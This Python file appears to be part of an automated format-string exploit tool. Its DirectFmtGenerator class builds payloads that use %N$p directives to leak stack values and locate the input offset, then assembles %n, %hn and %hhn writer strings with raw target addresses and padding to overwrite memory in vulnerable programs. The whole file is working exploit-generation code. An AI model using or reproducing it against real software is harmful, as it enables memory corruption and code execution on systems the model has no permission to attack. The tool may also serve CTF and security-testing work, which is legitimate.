import exceptions


class DirectFmtGenerator:
    def __init__(self):
        self.writers = list()

        self.direct_parameter_num = 1

        self.align_padding = ""

        self.temp_address = ""
        self.address = None

    def generate_next_fmt_for_find_start(self, max_length):
        fmt = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""

        if len(fmt) > max_length:
            raise exceptions.InputTooLittleError
        else:
            dim = len(fmt) + len(self.temp_address)
            reader_count = 1
            while True:
                reader = "%" + str(self.direct_parameter_num) + "$p"
                if len(reader) + dim > max_length:
                    break
                else:
                    reader_count += 1
                    self.direct_parameter_num += 1
                    dim += len(reader)
                    fmt += reader

            if reader_count >= 2:
                return self.temp_address + fmt
            else:
                raise exceptions.InputTooLittleError

    def generate_next_fmt_for_find_start_segfault_encountered(self, max_length):
        fmt = "%" + str(self.direct_parameter_num - 1) + "$p" + "%" + str(self.direct_parameter_num) + "$p"

        if len(self.temp_address + fmt) <= max_length:
            self.direct_parameter_num += 1
            return self.temp_address + fmt
        else:
            raise exceptions.InputTooLittleError

    def generate_next_fmt_for_find_start_markers_not_found(self, max_length, address_size):
        fmt = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""

        dim = address_size * 2
        if dim > max_length:
            raise exceptions.InputTooLittleError
        else:
            dim = len(fmt) + len(self.temp_address)
            reader_count = 1
            while True:
                reader = "%" + str(self.direct_parameter_num) + "$p"
                if len(reader) + dim > max_length:
                    break
                else:
                    reader_count += 1
                    self.direct_parameter_num += 1
                    dim += len(reader)
                    fmt += reader

            if reader_count >= 2:
                return self.temp_address + fmt
            else:
                raise exceptions.InputTooLittleError

    def generate_next_fmt_for_command_line_input(self, fmt_size):
        writers = ""

        for w in self.writers:
            print(len(w[1]))
            writers += "P" * len(w[0]) + "W" * (len(w[1]) + (1 + 4 + 1))

        addresses = self.temp_address + "C" * (len(self.writers) - 1)

        parameters = "%" + str(self.direct_parameter_num - 1) + "$p" if self.direct_parameter_num > 1 else ""

        if len(writers + addresses + parameters) > fmt_size:
            raise exceptions.InputTooLittleError
        else:
            dim = len(writers + addresses + parameters)
            reader_count = 1
            while True:
                reader = "%" + str(self.direct_parameter_num) + "$p"

                if len(reader) + dim > fmt_size:
                    break
                else:
                    reader_count += 1
                    self.direct_parameter_num += 1
                    dim += len(reader)
                    parameters += reader

            if reader_count < 2:
                raise exceptions.InputTooLittleError
            else:
                padding = "G" * (fmt_size - dim)
                return writers + addresses + parameters + padding

    def generate_fmt_for_find_end(self):
        writers = ""

        for w in self.writers:
            writers += w[0] + w[1].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n", "p")

        return writers + self.align_padding + self.temp_address * len(self.address)

    def generate_final_fmt(self, shift_for_broken_pattern, input_len):
        writers = ""

        for w in self.writers:
            writers += "V" * len(w[0]) + w[1].replace("ln", "p.").replace("hhn", "p..").replace("hn", "p.").replace("n",
                                                                                                                "p")
        shift_padding = "C" * shift_for_broken_pattern

        addresses = self.temp_address * len(self.writers)

        return writers + shift_padding + addresses + "C" * (input_len - len(writers + shift_padding + addresses))

    def generate_final_fmt2(self, shift_for_broken_pattern, markers0_len, input_len):
        writers = ""

        for w in self.writers:
            writers += w[0] + w[1]

        shift_padding = "B" * shift_for_broken_pattern
        markers0 = "0" * markers0_len

        addresses = b""
        for addr in self.address:
            addresses += addr

        final_padding = "C" * (input_len - len(writers + shift_padding + (self.temp_address * len(self.address))))

        return writers.encode() + markers0.encode() + shift_padding.encode() + addresses + final_padding.encode()
    
    def generate_fmt_in_byte(self):
        writers = ""
        for w in self.writers:
            writers += w[0] + w[1]

        fmt = writers.encode() + self.align_padding.encode()

        for addr in self.address:
            fmt += addr

        return fmt

    def set_direct_parameter_num(self, num):
        self.direct_parameter_num = num

    def get_direct_parameter_num(self):
        return self.direct_parameter_num

    def reset_direct_parameter_num(self):
        self.direct_parameter_num = 1

    def add_writer(self, writer):
        self.writers.append(writer)

    def set_align_padding(self, align_padding):
        self.align_padding = align_padding

    def set_temp_address(self, temp_address):
        self.temp_address = temp_address

    def set_address(self, address):
        self.address = address



